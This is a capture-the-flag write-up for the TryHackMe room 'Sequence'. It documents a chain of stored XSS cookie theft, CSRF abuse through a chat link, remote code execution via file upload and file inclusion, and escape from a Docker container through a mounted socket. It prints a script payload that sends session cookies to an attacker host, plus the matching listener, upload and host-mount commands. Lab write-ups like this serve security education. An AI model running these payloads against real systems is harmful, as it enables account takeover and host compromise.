# Sequence: Write-up
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web / Container Escape  

---

## 1. Reconnaissance & Web Enumeration

Initial connectivity and service identification:

```bash
└─$ sudo sh -c 'echo "<TARGET_IP> review.thm" >> /etc/hosts'
└─$ curl -i "http://review.thm/"
```

**Findings:**
* **Server:** Apache/2.4.41 (Ubuntu)
* **Framework:** PHP application using `PHPSESSID` for session management.
* **Key Routes:** `/login.php`, `/contact.php`, `/dashboard.php`.

---

## 2. Stored XSS → Session Hijacking

### Vulnerability Analysis
The `/contact.php` form does not sanitize the `message` field. Since feedback is reviewed by an internal agent, an attacker can inject a script to exfiltrate the reviewer's session cookie.

### Execution

1. **Payload Injection:**
```bash
└─$ curl -i \
  -d "name=RECON&phone=12345&message=<script>fetch('http://<ATTACKER_IP>:4444/'.concat(document.cookie))</script>" \
  "http://review.thm/contact.php"
```

2. **Capture Callback:**
```bash
└─$ nc -lvnp 4444
# Captured: GET /PHPSESSID=[REDACTED_SESSION_COOKIE]
```

3. **Session Takeover:**
Reusing the captured `PHPSESSID` granted access to the restricted dashboard.  
**Flag 1 obtained.**

---

## 3. Privilege Escalation: Weak CSRF & Admin Pivot

### Predictable Token Logic
The `promote_coadmin.php` functionality requires a `csrf_token_promote`. Analysis revealed the token is a predictable **MD5 hash of the target username**.

* `csrf_token_promote = md5("mod")` → `[REDACTED_MD5]`

### The "Chat" Pivot
As a non-admin, direct promotion is unauthorized. However, the internal `/chat.php` renders messages as clickable links. By sending the promotion URL as a message, an administrator clicking or viewing the link triggers the **GET** request in their privileged context.

```bash
└─$ curl -i -b "PHPSESSID=[REDACTED]" --data-urlencode \
  "message=http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=[REDACTED_MD5]" \
  "http://review.thm/chat.php"
```

**Result:** The `mod` account was promoted to the **admin** role.  
**Flag 2 obtained.**

---

## 4. Exploitation: File Inclusion & RCE

### File Inclusion Discovery
The dashboard uses a `feature` parameter that performs local file inclusion. Fuzzing led to a sensitive artifact:

```bash
└─$ curl -i -b "PHPSESSID=[REDACTED]" "http://review.thm/mail/dump.txt"
```

**Finding:** Disclosed the existence of `finance.php` and internal credentials.

---

### RCE Chain
The `finance.php` panel allows file uploads. While the uploads directory prevents direct execution, the uploaded file can be executed by including it through the `dashboard.php` feature.

1. **Upload Payload (via finance.php):**
```bash
└─$ curl -i -b "PHPSESSID=[REDACTED]" \
  -F "investor_file=@rev.php" \
  "http://review.thm/finance.php"
# Target path: uploads/rev.php
```

2. **Trigger Execution (POST via dashboard.php):**
```bash
└─$ curl -i -b "PHPSESSID=[REDACTED]" \
  -d "feature=uploads/rev.php" \
  "http://review.thm/dashboard.php"
```

**Context:** The shell returned as `uid=0(root)`. Although the process ran as UID 0, it was confined within a Docker container.

---

## 5. Post-Exploitation: Container Escape

### Docker Socket Exposure
Enumeration within the container revealed that the Docker socket (`/var/run/docker.sock`) was mounted, allowing the container to communicate with the host's Docker daemon.

### Host Filesystem Access
By leveraging the local Docker CLI to run a new container with the host's root directory mounted, the container boundary was bypassed.

```bash
└─$ docker run -v /:/mnt/root -it php:8.1-cli /bin/bash
# Accessing host filesystem from the new container:
└─$ cat /mnt/root/root/flag.txt
```

**Root Flag:** `THM{[REDACTED_FLAG]}`

---

